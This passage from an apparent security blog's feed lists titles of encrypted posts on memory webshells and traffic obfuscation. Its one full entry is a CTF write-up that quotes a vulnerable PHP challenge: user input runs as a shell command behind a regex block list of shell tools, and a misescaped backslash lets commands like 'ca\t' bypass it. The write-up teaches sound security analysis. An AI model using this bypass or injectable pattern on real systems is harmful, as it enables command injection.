    <content type="html"><![CDATA[<script src="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.4.1.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="此文章已被加密。" />    <label for="pass">此文章已被加密。</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      蚁剑改造计划之支持内存马
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Tomcat内存Webshell解析之Listener型</title>
    <link href="https://yzddmr6.com/posts/tomcat-memory-webshell-listener/"/>
    <id>https://yzddmr6.com/posts/tomcat-memory-webshell-listener/</id>
    <published>2020-08-08T13:37:22.000Z</published>
    <updated>2021-06-17T15:17:23.072Z</updated>
    
    <content type="html"><![CDATA[<script src="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.4.1.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="此文章已被加密。" />    <label for="pass">此文章已被加密。</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      tomcat-memory-webshell-listener
    
    </summary>
    
    
      <category term="技术文章" scheme="https://yzddmr6.com/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>Tomcat内存Webshell解析之Filter型</title>
    <link href="https://yzddmr6.com/posts/tomcat-memory-webshell-filter/"/>
    <id>https://yzddmr6.com/posts/tomcat-memory-webshell-filter/</id>
    <published>2020-07-14T12:28:03.000Z</published>
    <updated>2021-06-17T15:29:25.577Z</updated>
    
    <content type="html"><![CDATA[<script src="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.4.1.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="此文章已被加密。" />    <label for="pass">此文章已被加密。</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Tomcat内存Webshell解析
    
    </summary>
    
    
      <category term="技术文章" scheme="https://yzddmr6.com/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="webshell" scheme="https://yzddmr6.com/tags/webshell/"/>
    
  </entry>
  
  <entry>
    <title>ASP/ASPX下的流量混淆</title>
    <link href="https://yzddmr6.com/posts/asp-aspx-encoders/"/>
    <id>https://yzddmr6.com/posts/asp-aspx-encoders/</id>
    <published>2020-05-01T14:03:17.000Z</published>
    <updated>2021-06-17T15:13:14.820Z</updated>
    
    <content type="html"><![CDATA[<script src="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.4.1.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="此文章已被加密。" />    <label for="pass">此文章已被加密。</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      ASP/ASPX下的流量混淆
    
    </summary>
    
    
      <category term="技术文章" scheme="https://yzddmr6.com/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>从一道CTF的非预期解看PHP反斜杠匹配问题</title>
    <link href="https://yzddmr6.com/posts/php-preg-tricks/"/>
    <id>https://yzddmr6.com/posts/php-preg-tricks/</id>
    <published>2020-04-12T03:47:51.000Z</published>
    <updated>2021-06-17T15:31:40.997Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><h2 id="前言">前言</h2><p>刷buuoj的时候遇到<code>[安洵杯 2019]easy_web</code> 这样一个题，做一半看到他这个正则写的有点问题，就去翻wp。</p><p>找到了<a href="https://xz.aliyun.com/t/6911" target="_blank" rel="noopener">官方的wp</a>发现果然是个非预期。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900412316-7438ca54-f52c-4ed0-8487-28518cdeca04.png" alt="img"></p><p>但是官方wp中并没有深入说明。后来看到评论去翻出题人的博客也没找到相关的信息，加上看到了其他wp中一些不准确的说法，所以今天就有了这篇文章来讲一讲自己的看法。</p><h2 id="正文">正文</h2><p>题目源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(&apos;content-type:text/html;charset=utf-8&apos;);</span><br><span class="line">$cmd = $_GET[&apos;cmd&apos;];</span><br><span class="line">if (!isset($_GET[&apos;img&apos;]) || !isset($_GET[&apos;cmd&apos;])) </span><br><span class="line">    header(&apos;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&apos;);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[&apos;img&apos;])));</span><br><span class="line">$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;, &quot;&quot;, $file);</span><br><span class="line">if (preg_match(&quot;/flag/i&quot;, $file)) &#123;</span><br><span class="line">    echo &apos;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&apos;;</span><br><span class="line">    die(&quot;xixi～ no flag&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $txt = base64_encode(file_get_contents($file));</span><br><span class="line">    echo &quot;&lt;img src=&apos;data:image/gif;base64,&quot; . $txt . &quot;&apos;&gt;&lt;/img&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo $cmd;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&apos;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;, $cmd)) &#123;</span><br><span class="line">    echo(&quot;forbid ~&quot;);</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    if ((string)$_POST[&apos;a&apos;] !== (string)$_POST[&apos;b&apos;] &amp;&amp; md5($_POST[&apos;a&apos;]) === md5($_POST[&apos;b&apos;])) &#123;</span><br><span class="line">        echo `$cmd`;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo (&quot;md5 is funny ~&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>前面md5碰撞已经是老套路了，问题出在后面对shell命令的过滤上。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&apos;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;, $cmd)) &#123;</span><br><span class="line">    echo(&quot;forbid ~&quot;);</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>熟悉php代码审计的同学应该都知道，在preg_match中要过滤<code>\</code> 是需要四个<code>\\\\</code>才可以达到目的，原理如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$str = &apos;\/div&apos;;</span><br><span class="line">$pattern = &apos;/\\\\\/div/&apos;;</span><br><span class="line">// &apos;\\\\\/&apos; 解析过程如下：</span><br><span class="line">// PHP解析：</span><br><span class="line">// 第1个&apos;\&apos;转义第2个&apos;\&apos;，转义后为字符串&apos;\&apos;</span><br><span class="line">// 第3个&apos;\&apos;转义第4个&apos;\&apos;，转义后为字符串&apos;\&apos;</span><br><span class="line">// 第5个&apos;\&apos;转义&apos;/&apos;，转义后为字符串&apos;/&apos;</span><br><span class="line">// 字符合起来为&apos;\\/&apos; （则 \\/div 即为正则将要解析的内容，注意：正则解析的内容已经不包括正则标识符//）</span><br><span class="line">// 正则解析器解析：</span><br><span class="line">// 两个&apos;\\&apos; 正则表达式看做&apos;\&apos; （则正则最终解析为 \/div）</span><br><span class="line">$rs = preg_match($pattern, $str, $arr);</span><br><span class="line">if($rs) print_r($arr); // Array ( [0] =&gt; \/div )</span><br></pre></td></tr></table></figure><p>但是出题人似乎觉得不够，又在后面加了四个反斜杠的匹配，似乎本意是要过滤<code>\</code>跟<code>\\</code>？</p><p>理论来说已经出现了四个<code>\\\\</code>了，但是为什么还会造成非预期<code>ca\t</code>这种解呢？</p><p>我们本地测试一下</p><p>去掉其他的乱七八糟的东西，只留下对于反斜杠等的过滤</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900412435-aa033685-93cd-4d3b-bf4d-a10d879dcdd2.png" alt="img"></p><p>可以看到虽然正则中有<code>\\\\</code>，但是却无法过滤到反斜杠。</p><p>反向思考其原因，应该是问题出在前面两个反斜杠的匹配部分。</p><p>因为正则匹配中相当于要经过两层解析器解析，一层是php的，一层是正则表达式的。所以此处前面的两个反斜杠经过php解析器处理后应该是表示了一个转义号<code>\</code>，之后又与后面的表示逻辑或的<code>|</code>结合到一起，从而在正则表达式解析器中解析为<code>\|</code>。又因为<code>|</code>是正则中的保留符号，所以需要一个转义符来转义。所以最后的实现效果应为对于字符<code>|</code>的过滤。</p><p>所以我们猜测这种写法真正被解析的结果应该是对于字符串<code>|\</code>的过滤，即不是单独的<code>\</code>的匹配。</p><p>我们来验证一下猜想是否正确：</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900412560-28a7746f-6d38-4de8-83ab-60357d292f4a.png" alt="img"></p><p>可以看到此时已经触发了正则匹配机制，输出了forbid。</p><p>所以综上所述：非预期的原因是错误的正则写法匹配了<code>|\</code>，而非预期的<code>\</code></p><h2 id="错误的一些说法">错误的一些说法</h2><h3 id="第一个">第一个</h3><p><a href="https:_www.cnblogs.com_20175211lyz_p_12189515" target="_blank" rel="noopener">https://www.cnblogs.com/20175211lyz/p/12189515.html</a></p><p>这篇文章中提到反斜杠有这么多种匹配方法，如果你做实验的话发现也确实会输出1234。事实真的是这样吗？</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900413041-d64dd8f0-7f79-414a-a465-a4c6c262c8c7.png" alt="img"></p><p>随便写个字符串，发现134照样可以匹配到。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900413158-6e2dfe2e-e5e7-4eb1-b1a0-d9e13076ff37.png" alt="img"></p><p>原因是134条规则都在左右多加了个<code>|</code>，然而<code>|</code>左右为空，也就是说对于任意空字符串都可以匹配，而并非预期的目的。</p><h3 id="第二个">第二个</h3><p>这篇文章的解释是把\t当成tab，这个就更离谱了。</p><p><a href="https://blog.csdn.net/SopRomeo/article/details/104124545" target="_blank" rel="noopener">https://blog.csdn.net/SopRomeo/article/details/104124545</a></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900413248-c9604728-2b4b-406c-a6bf-f94e3e5d1624.png" alt="img"></p><h3 id="第三个">第三个</h3><p><a href="https://www.jianshu.com/p/21e3e1f74c08" target="_blank" rel="noopener">https://www.jianshu.com/p/21e3e1f74c08</a></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900413339-de5c280f-e3b3-42cf-8b1c-ba119b66fc82.png" alt="img"></p><p>这个同学自己调试了一番，离真相就差一点啦。</p><h2 id="最后">最后</h2><p>纸上得来终觉浅，绝知此事要躬行。</p><p>与君共勉。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;&lt;p&gt;刷buuoj的时候遇到&lt;code&gt;[安洵杯 2019]easy_web&lt;/code&gt; 这样一个题，做一半看到他这个正则写的有点问题，就去翻wp。&lt;/
      
    
    </summary>
    
    
      <category term="技术文章" scheme="https://yzddmr6.com/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="CTF" scheme="https://yzddmr6.com/tags/CTF/"/>
    
  </entry>
  
</feed>
